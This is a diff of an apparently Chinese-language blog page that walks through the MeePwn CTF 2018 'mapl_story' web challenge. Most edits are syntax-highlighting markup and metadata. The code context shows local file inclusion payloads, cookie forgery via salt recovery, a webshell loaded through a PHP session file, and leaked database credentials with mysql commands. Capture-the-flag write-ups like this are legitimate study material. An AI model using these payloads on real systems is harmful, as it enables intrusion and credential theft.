@@ -54,11 +54,11 @@
     "accountablePerson" : "syang",
     "copyrightHolder" : "syang",
     "copyrightYear" : "2018",
-    "datePublished": "2018-07-20 15:00:22 \x2b0000 UTC",
-    "dateModified" : "2018-07-20 15:00:22 \x2b0000 UTC",
+    "datePublished": "2018-07-20 15:00:22 \u002b0000 UTC",
+    "dateModified" : "2018-07-20 15:00:22 \u002b0000 UTC",
     "url" : "https:\/\/syang-ng.github.io\/2018\/07\/meepwnctf-2018-web-part2\/",
-    "wordCount" : "1954",
-    "keywords" : [  "syang\x27s blog"]
+    "wordCount" : "1958",
+    "keywords" : [  "syang\u0027s blog"]
 }
 </script>
 
@@ -155,23 +155,23 @@
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://178.128.87.16/?page=/etc/group
 </span></code></pre></div><pre><code>root❌0: daemon❌1: bin❌2: sys❌3: adm❌4:syslog tty❌5: disk❌6: lp❌7: mail❌8: news❌9: uucp❌10: man❌12: proxy❌13: kmem❌15: dialout❌20: fax❌21: voice❌22: cdrom❌24: floppy❌25: tape❌26: sudo❌27: audio❌29: dip❌30: www-data❌33: backup❌34: operator❌37: list❌38: irc❌39: src❌40: gnats❌41: shadow❌42: utmp❌43: video❌44: sasl❌45: plugdev❌46: staff❌50: games❌60: users❌100: nogroup❌65534: systemd-journal❌101: systemd-timesync❌102: systemd-network❌103: systemd-resolve❌104: systemd-bus-proxy❌105: input❌106: crontab❌107: syslog❌108: netdev❌109: lxd❌110: messagebus❌111: uuidd❌112: ssh❌113: mlocate❌114: admin❌115: docker❌116: ssl-cert❌117: mysql❌118:
 </code></pre><p>但可以看到由于在 <code>index.php</code> 中存在着相应的过滤：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function bad_words($value)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">bad_words</span>($value)
 {
-	//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.
-	//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!
-	$too_bad=&#34;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&#34;;
-	$value = preg_replace($too_bad, str_repeat(&#34;*&#34;,3) ,$value);
-	return $value;
+	<span style="color:#75715e">//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!
+</span><span style="color:#75715e"></span>	$too_bad<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&#34;</span>;
+	$value <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>($too_bad, <span style="color:#a6e22e">str_repeat</span>(<span style="color:#e6db74">&#34;*&#34;</span>,<span style="color:#ae81ff">3</span>) ,$value);
+	<span style="color:#66d9ef">return</span> $value;
 }
 
-foreach($_GET as $key=&gt;$value)
+<span style="color:#66d9ef">foreach</span>($_GET <span style="color:#66d9ef">as</span> $key<span style="color:#f92672">=&gt;</span>$value)
 {
-    if (is_array($value))
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_array</span>($value))
     {
-    	mapl_die();
+    	<span style="color:#a6e22e">mapl_die</span>();
     }
-	$value=bad_words($value);
-	$_GET[$key]=$value;
+	$value<span style="color:#f92672">=</span><span style="color:#a6e22e">bad_words</span>($value);
+	$_GET[$key]<span style="color:#f92672">=</span>$value;
 }
 </code></pre></div><p>暂时看来操作幅度不大，不过这里存在的意义在于我们可以泄露出相应 session 的信息</p>
 <p>已知我们 PHPSESSID 的值为 <code>o2c7bnl64jf2va8edho3ectvb6</code>，那么我们可以尝试通过以下网址访问我们的：</p>
@@ -180,26 +180,26 @@ foreach($_GET as $key=&gt;$value)
 </code></pre><h3 id="admin">Admin</h3>
 <p>尝试访问 <code>admin.php</code>，发现程序提示我们没有相应的 admin 权限，这意味着我们的第一步很可能是先变为 admin</p>
 <p>审计代码，可以看到服务器对 admin 的校验是以 Cookie 中的 <code>_role</code> 为依据的</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function is_admin($salt){
-    if(isset($_COOKIE[&#39;_role&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> !empty($_COOKIE[&#39;_role&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> $_COOKIE[&#39;_role&#39;]===hash(&#39;sha256&#39;, &#39;admin&#39;.$salt)) {
-        return 1;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_admin</span>($salt){
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_COOKIE[<span style="color:#e6db74">&#39;_role&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_COOKIE[<span style="color:#e6db74">&#39;_role&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_COOKIE[<span style="color:#e6db74">&#39;_role&#39;</span>]<span style="color:#f92672">===</span><span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, <span style="color:#e6db74">&#39;admin&#39;</span><span style="color:#f92672">.</span>$salt)) {
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
     }
-        return 0;
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
 </code></pre></div><p>只有当 <code>sha256('admin'.$salt)</code> 的值与 Cookie 中 <code>_role</code> 值相等时，服务器会主动将用户识别为 admin</p>
 <p>继续审计代码，我们得到的结论是，我们无法通过手动修改 Cookie 外的方式成为 admin，因为服务端会默认将所有人设置成 user：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">// login
-if ($row[&#39;userIsAdmin&#39;]===&#39;1&#39;){
-    $data=&#39;admin&#39;.$salt;
-    $role=hash(&#39;sha256&#39;, $data);
-    setcookie(&#39;_role&#39;,$role);
-} else {
-    $data=&#39;user&#39;.$salt;
-    $role=hash(&#39;sha256&#39;, $data);
-    setcookie(&#39;_role&#39;,$role);					
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// login
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($row[<span style="color:#e6db74">&#39;userIsAdmin&#39;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#39;1&#39;</span>){
+    $data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;</span><span style="color:#f92672">.</span>$salt;
+    $role<span style="color:#f92672">=</span><span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $data);
+    <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;_role&#39;</span>,$role);
+} <span style="color:#66d9ef">else</span> {
+    $data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;user&#39;</span><span style="color:#f92672">.</span>$salt;
+    $role<span style="color:#f92672">=</span><span style="color:#a6e22e">hash</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $data);
+    <span style="color:#a6e22e">setcookie</span>(<span style="color:#e6db74">&#39;_role&#39;</span>,$role);					
 }
-// register
-$query = &#34;INSERT INTO users(`userName`, `userEmail`, `userPass`, `userIsAdmin`, `userDesc`, `userAvatar`) VALUES(&#39;$name&#39;,&#39;$email&#39;,&#39;$password&#39;,0,&#39; &#39;,&#39;default.png&#39;)&#34;;
+<span style="color:#75715e">// register
+</span><span style="color:#75715e"></span>$query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;INSERT INTO users(`userName`, `userEmail`, `userPass`, `userIsAdmin`, `userDesc`, `userAvatar`) VALUES(&#39;</span><span style="color:#e6db74">$name</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">$email</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">$password</span><span style="color:#e6db74">&#39;,0,&#39; &#39;,&#39;default.png&#39;)&#34;</span>;
 </code></pre></div><p>那么我们唯一的思路即通过计算出 <code>$salt</code> 的方式来计算出我们希望的 sha256 值，脚本如下：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 <span style="color:#f92672">import</span> string
@@ -259,19 +259,19 @@ s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</sp
 <p>我们可以尝试给自己赠送一个宠物，然后在 <code>character.php</code> 来训练一个宠物：</p>
 <p><img src="/images/posts/MeePwn-CTF-2018-Web/mapl_story_character.png" alt="Character"></p>
 <p>继续审计 PHP 代码，我们可以知道相应的命令会被存入 <code>/upload/md5($salt.$email)/command.txt</code> 中：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if(isset($_POST[&#39;command&#39;]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> !empty($_POST[&#39;command&#39;])){
-    if(strlen($_POST[&#39;command&#39;])&gt;=20) {
-        echo &#39;&lt;<span style="color:#f92672">center</span>&gt;&lt;<span style="color:#f92672">strong</span>&gt;Too Long&lt;/<span style="color:#f92672">strong</span>&gt;&lt;/<span style="color:#f92672">center</span>&gt;&#39;;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;command&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;command&#39;</span>])){
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#39;command&#39;</span>])<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">20</span>) {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;center&gt;&lt;strong&gt;Too Long&lt;/strong&gt;&lt;/center&gt;&#39;</span>;
     }
-    else {
-        save_command($mail,$salt,$_POST[&#39;command&#39;]);
-        header(&#34;Refresh:0&#34;);
+    <span style="color:#66d9ef">else</span> {
+        <span style="color:#a6e22e">save_command</span>($mail,$salt,$_POST[<span style="color:#e6db74">&#39;command&#39;</span>]);
+        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Refresh:0&#34;</span>);
     }
 }
 
-function save_command($email,$salt,$data){
-    $dir=&#39;./upload/&#39;.md5($salt.$email);
-    file_put_contents($dir.&#39;/command.txt&#39;, $data);
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">save_command</span>($email,$salt,$data){
+    $dir<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./upload/&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($salt<span style="color:#f92672">.</span>$email);
+    <span style="color:#a6e22e">file_put_contents</span>($dir<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/command.txt&#39;</span>, $data);
 }
 </code></pre></div><p>那么我们可不可以直接在这里写入 webshell 呢？再利用 LFI 加载该文件以达成 webshell 效果，但事实是这条尝试是失败的😭</p>
 <p>那么剩下的思路是再从新的地方尝试导入我们编写的 webshell</p>
@@ -289,7 +289,7 @@ function save_command($email,$salt,$data){
 </ol>
 <p>此时我们已经拿到了一个最基本的 webshell，构造 payload，我们即能得到 <code>dbconnect.php</code> 相对应的源代码：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_o2c7bnl64jf2va8edho3ectvb6&amp;1=cat%20dbconnect.php
-</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#75715e">&lt;?php</span>
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBHOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span>);
 	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBUSER&#39;</span>, <span style="color:#e6db74">&#39;mapl_story_user&#39;</span>);
 	<span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#39;DBPASS&#39;</span>, <span style="color:#e6db74">&#39;tsu_tsu_tsu_tsu&#39;</span>); 
@@ -300,8 +300,8 @@ function save_command($email,$salt,$data){
 	<span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>$conn ) {
 		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Connection failed : &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysql_error</span>());
     }
-<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>此时我们已经拿到了数据库的账号密码，以及相应的数据库名，那么只要在数据库中运行 <code>SELECT * FROM mapl_config</code>，即能获得相应的 flag</p>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>此时我们已经拿到了数据库的账号密码，以及相应的数据库名，那么只要在数据库中运行 <code>SELECT * FROM mapl_config</code>，即能获得相应的 flag</p>
 <p>我们需要实现以下两步：</p>
 <ol>
 <li>连接数据库：mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</li>
@@ -386,7 +386,7 @@ function save_command($email,$salt,$data){
     <div class="copyright">
         &copy;
         
-        <span itemprop="copyrightYear">2017 - 2020</span>
+        <span itemprop="copyrightYear">2017 - 2021</span>
         
         <span class="with-love">
     	 <i class="iconfont icon-love"></i> 
